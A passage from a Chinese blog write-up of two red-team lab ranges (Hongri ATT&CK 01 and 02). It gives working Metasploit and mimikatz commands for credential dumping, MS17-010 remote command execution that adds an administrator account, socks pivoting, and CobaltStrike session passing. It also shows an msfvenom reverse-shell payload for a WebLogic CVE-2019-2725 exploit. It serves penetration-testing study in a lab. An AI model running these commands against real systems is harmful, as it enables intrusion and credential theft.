class="line">    password_change        Change the password/hash of a user</span><br><span class="line">    wifi_list              List wifi profiles/creds for the current user</span><br><span class="line">    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)</span><br></pre></td></tr></table></figure><p>这里应该是我环境配置的原因，直接就上管理员权限了，先加载msf的模块<code>kiwi</code>，这个模块代替了<code>mimikatz</code>模块，上面的命令为查询kiwi模块的使用方式的命令。</p><p><strong>kiwi_cmd模块，可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令即可</strong></p><p>kiwi专用的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure><p>没dump出来，但是直接用mimikatz的话会报错，必须把当前进程迁移到64位进程中去，进程迁移使用以下命令，ps回显太多不复制了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name               Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----               ----  -------  ----                          ----</span><br><span class="line"> 0     0     [System Process]</span><br><span class="line"> 4     0     System             x64   0</span><br><span class="line"> 252   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe</span><br><span class="line"> 308   612   slui.exe           x64   1        GOD\Administrator             C:\Windows\System32\slui.exe</span><br><span class="line"> 332   324   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> 340   492   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe</span><br><span class="line"> 384   324   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe</span><br><span class="line"> 396   376   csrss.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> 432   376   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe</span><br><span class="line"> 492   384   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe</span><br><span class="line"> 500   384   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe</span><br><span class="line"></span><br><span class="line">meterpreter &gt; migrate 332</span><br><span class="line">[*] Migrating from 1196 to 2044...</span><br><span class="line">[*] Migration completed successfully.</span><br><span class="line">meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605165646907.png" alt="image-20210605165646907"></p><p>账户密码获得为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator/@dmin123</span><br></pre></td></tr></table></figure><p><strong>开3389端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/enable_rdp</span><br><span class="line"></span><br><span class="line">[*] Enabling Remote Desktop</span><br><span class="line">[*] RDP is already enabled</span><br><span class="line">[*] Setting Terminal Services service startup mode</span><br><span class="line">[*] Terminal Services service is already set to auto</span><br><span class="line">[*] Opening port in local firewall if necessary</span><br><span class="line">[*] For cleanup execute Meterpreter resource file: /home/m4xlmum/.msf4/loot/20210605172936_default_192.168.72.128_host.windows.cle_771977.txt</span><br></pre></td></tr></table></figure><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605173036618.png"></p><p><strong>开远程桌面</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -g 1440x900  192.168.72.128:3389</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名: GOD\administrator   # 域用户登录，用户民格式为：域名\用户名</span><br><span class="line">密  码: @dmin123</span><br></pre></td></tr></table></figure><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605173536027.png"></p><p>这个最好是再开一个用户，而且再开一个用户也应该用不到抓administrator的用户密码了，所做的工作就会少很多（主要是学习嘛，也走了许多弯路）。</p><h3 id="三、内网搜集"><a href="#三、内网搜集" class="headerlink" title="三、内网搜集"></a>三、内网搜集</h3><h4 id="7-内网–继续信息收集"><a href="#7-内网–继续信息收集" class="headerlink" title="7.内网–继续信息收集"></a>7.内网–继续信息收集</h4><p>接下来看看其他主机了，这个已经算是拿下了吧，虽然不太完美，下一个争取完美一点。</p><p><strong>配置静态路由</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.52.0/24</span><br></pre></td></tr></table></figure><p><strong>内网存活主机扫描</strong></p><p>使用msf自带netbios扫描内网存活机器，发现存活机器还有其他两台，地址分别为<code>192.168.52.138</code>和<code>192.168.52.141</code>，本机为<code>192.168.52.143</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use auxiliary/scanner/netbios/nbname</span><br><span class="line">msf6 auxiliary(scanner/netbios/nbname) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 auxiliary(scanner/netbios/nbname) &gt; set rhosts 192.168.52.0/24</span><br><span class="line">rhosts =&gt; 192.168.52.0/24</span><br><span class="line">msf6 auxiliary(scanner/netbios/nbname) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Sending NetBIOS requests to 192.168.52.0-&gt;192.168.52.255 (256 hosts)</span><br><span class="line">[+] 192.168.52.138 [OWA] OS:Windows Names:(OWA, GOD) Addresses:(192.168.52.138) Mac:00:0c:29:3f:5d:a9 Virtual Machine:VMWare</span><br><span class="line">[+] 192.168.52.141 [ROOT-TVI862UBEH] OS:Windows Names:(ROOT-TVI862UBEH, GOD, __MSBROWSE__) Addresses:(192.168.52.141) Mac:00:0c:29:6d:39:34 Virtual Machine:VMWare</span><br><span class="line">[+] 192.168.52.143 [STU1] OS:Windows Names:(STU1, GOD)  Mac:00:0c:29:a7:c1:a8 Virtual Machine:VMWare</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><strong>域内信息收集命令(抄徐神的，爽)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net time /domain        #查看时间服务器</span><br><span class="line">net user /domain        #查看域用户</span><br><span class="line">net view /domain        #查看有几个域</span><br><span class="line">net group &quot;domain computers&quot; /domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain admins&quot;   /domain          #查看域管理员</span><br><span class="line">net group &quot;domain controllers&quot; /domain       #查看域控</span><br></pre></td></tr></table></figure><h3 id="四、横向移动"><a href="#四、横向移动" class="headerlink" title="四、横向移动"></a>四、横向移动</h3><h4 id="8-CobaltStrike联动msf"><a href="#8-CobaltStrike联动msf" class="headerlink" title="8.CobaltStrike联动msf"></a>8.CobaltStrike联动msf</h4><p>msf获取到shell后，可以派发给cobaltstrike，首先cobaltstrike创建监听器：</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605193822354.png"></p><p>msf执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true   #payload_inject执行之后会在本地产生一个新的handler，设置为true表示不重复生成</span><br><span class="line">set lhost 192.168.72.130                 #公网vps ip</span><br><span class="line">set lport 8888                  #监听端口 </span><br><span class="line">set session 1                   #派发session id</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>执行完所有命令之后将会看到CobaltStrike中有一台主机上线</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605194323631.png"></p><p>这里的原理就是，受害者网络反弹了一个shell到msf，msf又给自己生成了一个shell，再将网络送到CS(大概猜测)。</p><h4 id="9-搭建跳板主机"><a href="#9-搭建跳板主机" class="headerlink" title="9.搭建跳板主机"></a>9.搭建跳板主机</h4><p>其实就是将拿到权限的受害者主机(win7 web服务器)作为跳板(代理服务器)来连通内网。</p><p><strong>搭建Socket4a隧道 + proxychains</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set version 4a</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">jobs  # 查看任务是否正常执行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains.conf  #配置proxychains</span><br><span class="line">socks4 127.0.0.1 1080</span><br></pre></td></tr></table></figure><p>这是就算是成功搭建跳板主机了，测试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl http://192.168.72.128</span><br></pre></td></tr></table></figure><p>返回的是php study探针的内容的话应该就是搭建成功了的。</p><h4 id="10-内网端口扫描"><a href="#10-内网端口扫描" class="headerlink" title="10.内网端口扫描"></a>10.内网端口扫描</h4><p>由上面的代理服务就能直接使用nmap来扫描了，开始我用的是msf自带的扫描模块，<em>但是速度远远不如nmap感觉，还是nmap用着舒服</em>我收回斜体的这些话，可能是我不会用nmap，还没msf自带的快</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -F -T4 192.168.52.138</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.52.138</span><br><span class="line">Host is up (4.0s latency).</span><br><span class="line">Not shown: 90 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line">49155/tcp open  unknown</span><br><span class="line">49157/tcp open  unknown</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -F -T4 192.168.52.141</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.52.141</span><br><span class="line">Host is up (1.1s latency).</span><br><span class="line">Not shown: 95 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">1025/tcp open  NFS-or-IIS</span><br></pre></td></tr></table></figure><p>这里只对<code>--top-ports 100</code>进行扫描，扫描结果分别粘贴在了上面。</p><p>注意到上面得两个主机都开了<code>445号端口</code>，了解到445号端口是Windows进行SMB通信得端口，是存在漏洞的，并且msf中也有相应的扫描的模块<code>auxiliary/admin/smb/ms17_010_command</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set RHOSTS 192.168.52.141</span><br><span class="line"></span><br><span class="line">set command net user m4xlmum @dmin121 /add #添加用户</span><br><span class="line">run #成功执行</span><br><span class="line">set command net localgroup administrators m4xlmum /add #管理员权限</span><br><span class="line">run #成功执行</span><br><span class="line">set command &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;</span><br><span class="line">run #成功执行</span><br></pre></td></tr></table></figure><p>然后连接远程桌面<code>proxychains rdesktop 192.168.52.141</code>，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:m4xlmum</span><br><span class="line">password:@dmin121</span><br></pre></td></tr></table></figure><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605233517509.png"></p><p>但是刚才我新建的那个用户是不能连接到<code>GOD域网络</code>的，只能连141号，这一个主机</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605233627848.png"></p><p>再在141号机子上开一个后门程序。<strong>没开成功</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没成功这里也没必要填了</span><br></pre></td></tr></table></figure><h3 id="五、域控"><a href="#五、域控" class="headerlink" title="五、域控"></a>五、域控</h3><h4 id="11-ms17-010再利用"><a href="#11-ms17-010再利用" class="headerlink" title="11.ms17-010再利用"></a>11.ms17-010再利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line">49155/tcp open  unknown</span><br><span class="line">49157/tcp open  unknown</span><br></pre></td></tr></table></figure><p>直接试试用445端口的那个再打一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set RHOSTS 192.168.52.138</span><br><span class="line">set command net user m4xlmum @dmin121 /add</span><br><span class="line">run</span><br><span class="line">set command net localgroup administrators m4xlmum /add </span><br><span class="line">run</span><br><span class="line">set command &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>不行，好累，放弃了至此。</p><p>第一个没拿到域控，应该还是没经验会的少，下周再继续学。</p><h2 id="红日安全靶场-lt-02-ATT-amp-CK红队评估-gt"><a href="#红日安全靶场-lt-02-ATT-amp-CK红队评估-gt" class="headerlink" title="红日安全靶场&lt;02 ATT&amp;CK红队评估&gt;"></a>红日安全靶场&lt;02 ATT&amp;CK红队评估&gt;</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。关于靶场统一登录密码：1qaz@WSX</span><br><span class="line"></span><br><span class="line">1. Bypass UAC</span><br><span class="line">2. Windows系统NTLM获取（理论知识：Windows认证）</span><br><span class="line">3. Access Token利用（MSSQL利用）</span><br><span class="line">4. WMI利用</span><br><span class="line">5. 网页代理，二层代理，特殊协议代理（DNS，ICMP）</span><br><span class="line">6. 域内信息收集</span><br><span class="line">7. 域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用</span><br><span class="line">8. 域凭证收集</span><br><span class="line">9. 后门技术（黄金票据/白银票据/Sid History/MOF）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">****环境说明****</span><br><span class="line">内网网段：10.10.10.1/24</span><br><span class="line">DMZ网段：192.168.111.1/24</span><br><span class="line">测试机地址：192.168.111.1（Windows），192.168.111.11（Linux）</span><br><span class="line"></span><br><span class="line">防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问）：</span><br><span class="line">deny all tcp ports：10.10.10.1</span><br><span class="line">allow all tcp ports：10.10.10.0/24</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">****配置信息****</span><br><span class="line"></span><br><span class="line">**DC**</span><br><span class="line">IP：10.10.10.10</span><br><span class="line">OS：Windows 2012(64)</span><br><span class="line">应用：AD域</span><br><span class="line"></span><br><span class="line">**WEB**</span><br><span class="line">IP1：10.10.10.80</span><br><span class="line">IP2：192.168.111.80</span><br><span class="line">OS：Windows 2008(64)</span><br><span class="line">应用：Weblogic 10.3.6MSSQL 2008</span><br><span class="line"></span><br><span class="line">**PC**</span><br><span class="line">IP1：10.10.10.201</span><br><span class="line">IP2：192.168.111.201</span><br><span class="line">OS：Windows 7(32)</span><br><span class="line">应用：</span><br><span class="line"></span><br><span class="line">**攻击机**</span><br><span class="line">IP：192.168.111.1</span><br><span class="line">OS：Windows 10(64)</span><br><span class="line"></span><br><span class="line">IP：192.168.111.11</span><br><span class="line">OS：Parrot(64)</span><br></pre></td></tr></table></figure><p><strong>网络拓补图</strong></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210606112119602.png"></p><h3 id="一、环境搭建-1"><a href="#一、环境搭建-1" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h3><h4 id="关于web主机用户名密码错误"><a href="#关于web主机用户名密码错误" class="headerlink" title="关于web主机用户名密码错误"></a>关于web主机用户名密码错误</h4><p>这个应该是靶场的问题，毕竟用爱发电，哪里有点做的不好也非常可以理解，还是可以玩一玩的。</p><ol><li>先将win server 2008虚拟机恢复快照到最新的那个，应该是最上面那个<code>V1.3 10月21号</code>的那个。</li><li>重新启动了之后直接登录<code>WEB\de1ay    1qaz@WSX</code>会提示让修改密码，修改密码为<code>@dmin123</code>即可。</li></ol><h4 id="关于这次环境网卡的配置"><a href="#关于这次环境网卡的配置" class="headerlink" title="关于这次环境网卡的配置"></a>关于这次环境网卡的配置</h4><p> 这次主要是修改了虚拟机内部的网络设置，外部的与上一个还是差不太多的。</p><p>先说一下这次的外、内网的ip分配</p><table><thead><tr><th>主机</th><th>ip</th></tr></thead><tbody><tr><td>PC、DC、WEB</td><td>都有内网的ip(10.10.10.0)</td></tr><tr><td>攻击机、PC、WEB</td><td>都有外网的ip(192.168.10.0)</td></tr></tbody></table><p>并且这次的外网ip分配成了，VMware的NAT模式，一般来说是应该可以连通外网的，上几张图。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210607002210409.png"></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210606213750392.png" alt="VMWare设置"></p><p>这里我各个机器的ip地址分配如下</p><table><thead><tr><th>主机</th><th>内网IP</th><th>外网IP</th></tr></thead><tbody><tr><td>WEB</td><td>10.10.10.80</td><td>192.168.10.132</td></tr><tr><td>PC</td><td>10.10.10.201</td><td>192.168.10.133</td></tr><tr><td>DC</td><td>10.10.10.10</td><td>无</td></tr><tr><td>kali攻击机</td><td>无</td><td>192.168.10.129</td></tr></tbody></table><p>然后还有WEB虚拟机、PC虚拟机，内部的模拟外网ip，要调成自动分配ip。挺简单的就不截图了这个。</p><p>再然后要注意的就是那个靶场说明里边的weblogic漏洞利用，我的一开始那个weblogic是没有启动成功的，原因就是你需要登录的是管理员的账号</p><p><a href="https://jingyan.baidu.com/article/ad310e80d1a6e21849f49e9c.html">WebLogic出现没启动的特殊情况参考这篇文章</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">de1ay\administrator</span><br><span class="line">1qaz@WSX</span><br></pre></td></tr></table></figure><p>当然如果你登陆的不是管理员账号也没什么关系，把下面的这个右键以管理员权限身份运行即可</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210607004118696.png"></p><p>但是会出现像我这里出现的这种大黑框，但是毕竟我们不需要直接在这台WEB主机上进行什么操作，所以我就直接以管理员身份运行了。再去kali里面扫一下端口开放情况。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210607004946587.png" alt="这守再是扫描会发现7001端口已经上线了"></p><h3 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h3><p>先来第一波信息收集，这里主要针对WEB主机进行扫描</p><p>端口开放情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">80/tcp    open  http</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">1433/tcp  open  ms-sql-s</span><br><span class="line">3389/tcp  open  ms-wbt-server</span><br><span class="line">7001/tcp  open  afs3-callback</span><br><span class="line">49152/tcp open  unknown</span><br><span class="line">49153/tcp open  unknown</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line">49155/tcp open  unknown</span><br><span class="line">49156/tcp open  unknown</span><br></pre></td></tr></table></figure><p>这里我改一下上一篇总结的格式，分开三台主机(WEB主机、PC主机、DC主机)这样写。</p><h3 id="三、拿下WEB主机"><a href="#三、拿下WEB主机" class="headerlink" title="三、拿下WEB主机"></a>三、拿下WEB主机</h3><h4 id="主要目标"><a href="#主要目标" class="headerlink" title="主要目标"></a>主要目标</h4><p><strong>这里主要目标有三个：1.拿到WEB主机地后门、2.拿到WEB主机内部的密码、3.让WEB主机作为进入内网的跳板</strong></p><h4 id="1-WebLogic漏洞利用"><a href="#1-WebLogic漏洞利用" class="headerlink" title="1.WebLogic漏洞利用"></a>1.WebLogic漏洞利用</h4><blockquote><p>weblogic是什么？ WebLogic是美国bea公司出品的一个<strong>application server</strong>确切的说是一个基于j2ee架构的中间件，webserver是用来构建网站的必要软件用来解析发布网页等功能，它是用纯java开发的。 weblogic本来不是由bea发明的，是它从别人手中买过来，然后再加工扩展。 目前weblogic在世界application server市场上占有最大的份额，其他还有象IBM的websphere，免费的tomcat、resin等中间件。 BEA WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。</p></blockquote><p><strong>这里使用的工具是WebLogic Scan</strong></p><p><a href="https://gitee.com/omg2019/WeblogicScan-1?_from=gitee_search">weblogic-scan下载地址gitee</a></p><p>GitHub有点慢，直接用gitee上面的应该也是可以的，下载后解压到kali里面</p><p>我的直接就能使用了，没下载<code>requiremens.txt</code>如果出现运行失败请自行下载。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210607011653673.png"></p><p>扫出来的漏洞如上图所示，这里一个一个验证知道可以上传后门程序为止。</p><p>首先是后台路径的问题，这里是一个简单的没有验证码的后台登陆，但是使用了两个弱口令就没再试了，毕竟是弱口令进去还要再进行攻击，下面的这几个应该可以直接进行攻击。</p><p>下面的SSRF利用起来也是有点复杂的，这里使用<code>Weblogic反序列化漏洞(CVE-2019-2725)</code>来进行攻击，上传木马。</p><p><a href="https://www.cnblogs.com/twlr/p/13027190.html">参考这篇文章</a>，但是即使如此还是特别麻烦，这里选择使用师傅的工具。</p><p><a href="https://kfi.re/220.html">工具下载</a>、<a href="https://www.cnblogs.com/sstfy/p/10350915.html">工具使用</a></p><p><strong>这个工具使用的java的版本网上说的不太详细，使用了11与16与8都失败了，暂时放弃</strong></p><p><a href="https://www.anquanke.com/post/id/242566">使用exploit-db的利用脚本解决，参考的是这篇文章</a></p><ol><li>首先生成一个反弹shell的powershell脚本，使用以下命令，使用工具为msfvenom</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.129 LPORT=4444 -f psh-cmd &gt; reverse.ps1</span><br><span class="line"></span><br><span class="line"># 这个IP地址是你攻击机的ip，端口随意设置</span><br></pre></td></tr></table></figure><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210614224550563.png"></p><ol start="2"><li><a href="https://www.exploit-db.com/exploits/46780">下载Exploit</a>，并且将里面的exploit的内容替换为生成的payload</li></ol><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210614225036115.png"></p><p><img 